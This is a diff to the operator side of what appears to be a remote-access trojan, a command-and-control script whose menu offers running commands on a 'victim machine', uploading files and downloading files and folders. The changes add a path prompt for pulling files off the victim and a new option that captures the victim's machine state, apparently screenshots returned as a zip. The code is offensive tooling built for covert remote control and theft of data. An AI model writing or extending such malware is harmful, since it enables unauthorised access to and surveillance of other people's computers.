@@ -10,6 +10,8 @@ def showOptions():
     print("\t\t 1. Run Command on victim machine")
     print("\t\t 2. Upload file")
     print("\t\t 3. Download Files and folder from the victim machine")
+    print("\t\t 4. Capture victim machine state")
+    
     
 
 def handleConnection(my_socket):
@@ -64,12 +66,21 @@ def handleConnection(my_socket):
         elif user_input == "3":
 
             print("Download files from the victim")
-            
-           
-            
             my_socket.send_data(user_input)
-                       
-            my_socket.download_file()
+            print("navigate to the path and ")
+            path = input("Enter path >> ")
+            my_socket.send_data(path)
+
+            print("waiting for the files...")
+
+            filename  = my_socket.recieve_data()
+            my_socket.download_file(filename)
+
+
+        elif user_input == '4':
+            my_socket.send_data(user_input)
+            my_socket.download_file("screenshot.zip")
+
 
 
             
